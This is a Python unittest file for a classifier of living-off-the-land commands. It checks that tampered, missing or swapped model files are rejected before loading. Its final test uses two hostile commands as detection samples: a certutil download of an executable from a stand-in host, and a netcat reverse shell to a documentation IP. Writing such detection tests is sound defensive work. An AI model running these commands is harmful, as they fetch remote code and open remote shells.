"""Security regression tests: an invalid file must never reach joblib.load."""
import hashlib
from io import BytesIO
import json
from pathlib import Path
import tempfile
import unittest
from unittest.mock import Mock, patch

from src.config import FEATURE_VERSION, paths
from src.models.predictor import LotLPredictor


class ArtifactIntegrityTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        self.corpus = self.root / "known.corpus"
        self.corpus.write_bytes(b"one two three four\n")
        self.artifacts = {
            "classifier_sha256": ("rf_classifier.joblib", b"classifier snapshot"),
            "vectorizer_sha256": ("vectorizer.joblib", b"vectorizer snapshot"),
        }
        self.metadata = {
            "feature_version": FEATURE_VERSION,
            "threshold": 0.5,
            "corpus_sha256": hashlib.sha256(self.corpus.read_bytes()).hexdigest(),
        }
        for key, (name, data) in self.artifacts.items():
            (self.root / name).write_bytes(data)
            self.metadata[key] = hashlib.sha256(data).hexdigest()
        self.write_metadata()
        self.addCleanup(patch.stopall)
        patch("src.models.predictor.paths", return_value={
            "models": self.root, "corpus": self.corpus,
        }).start()
        patch("src.models.predictor.make_pipeline").start()
        self.load = patch("src.models.predictor.joblib.load").start()
        self.load.side_effect = [Mock(classes_=[0, 1]), Mock()]

    def write_metadata(self):
        (self.root / "feature_config.json").write_text(json.dumps(self.metadata), encoding="utf-8")

    def assert_rejected_before_load(self, platform):
        with self.assertRaisesRegex(ValueError, "Model artifact integrity check failed"):
            LotLPredictor(platform)
        self.load.assert_not_called()

    def test_valid_snapshots_are_loaded(self):
        LotLPredictor()
        self.assertEqual(self.load.call_count, 2)
        snapshots = [call.args[0] for call in self.load.call_args_list]
        self.assertTrue(all(isinstance(snapshot, BytesIO) for snapshot in snapshots))
        self.assertEqual([s.getvalue() for s in snapshots], [v[1] for v in self.artifacts.values()])

    def test_tampered_artifacts_fail_before_either_load(self):
        for platform in ("windows", "linux"):
            for name, data in self.artifacts.values():
                with self.subTest(platform=platform, artifact=name):
                    (self.root / name).write_bytes(data + b"tampered")
                    self.assert_rejected_before_load(platform)
                    (self.root / name).write_bytes(data)

    def test_missing_or_malformed_hashes_fail_closed(self):
        for key in self.artifacts:
            expected = self.metadata[key]
            for invalid in (None, "", "0" * 63, "g" * 64, 123, []):
                with self.subTest(key=key, invalid=invalid):
                    self.metadata[key] = invalid
                    self.write_metadata()
                    self.assert_rejected_before_load("windows")
            del self.metadata[key]
            self.write_metadata()
            self.assert_rejected_before_load("linux")
            self.metadata[key] = expected

    def test_missing_or_truncated_artifacts_fail_closed(self):
        for name, data in self.artifacts.values():
            with self.subTest(artifact=name):
                artifact = self.root / name
                artifact.unlink()
                self.assert_rejected_before_load("windows")
                artifact.write_bytes(b"")
                self.assert_rejected_before_load("linux")
                artifact.write_bytes(data)

    def test_replacing_file_during_load_does_not_change_verified_snapshot(self):
        def load_snapshot(stream):
            (self.root / "vectorizer.joblib").write_bytes(b"replacement")
            return Mock(classes_=[0, 1])
        self.load.side_effect = load_snapshot
        LotLPredictor()
        self.assertEqual(self.load.call_args_list[1].args[0].getvalue(), b"vectorizer snapshot")

    def test_changed_corpus_is_rejected_before_loading(self):
        self.corpus.write_bytes(b"different corpus\n")
        with self.assertRaisesRegex(ValueError, "BLEU corpus changed"):
            LotLPredictor()
        self.load.assert_not_called()


class ShippedModelTests(unittest.TestCase):
    def test_real_artifact_hashes_and_predictions(self):
        for platform, command in (
            ("windows", "certutil.exe -urlcache -split -f http://example.com/a.exe C:\\Temp\\a.exe"),
            ("linux", "nc -e /bin/sh 192.0.2.10 4444"),
        ):
            with self.subTest(platform=platform):
                files = paths(platform)
                config = json.loads((files["models"] / "feature_config.json").read_text())
                for key, name in (("classifier_sha256", "rf_classifier.joblib"),
                                  ("vectorizer_sha256", "vectorizer.joblib")):
                    self.assertEqual(config[key], hashlib.sha256((files["models"] / name).read_bytes()).hexdigest())
                self.assertEqual(config["corpus_sha256"], hashlib.sha256(files["corpus"].read_bytes()).hexdigest())
                self.assertEqual(LotLPredictor(platform).predict(command)["verdict"], "BAD")


if __name__ == "__main__":
    unittest.main()
